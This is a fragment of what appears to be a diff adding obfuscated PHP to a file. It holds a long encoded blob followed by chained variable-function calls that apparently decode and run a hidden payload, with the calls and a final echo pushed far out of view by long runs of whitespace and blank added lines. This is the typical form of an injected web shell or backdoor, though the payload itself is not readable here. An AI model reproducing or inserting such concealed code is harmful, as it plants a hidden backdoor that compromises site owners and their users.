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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
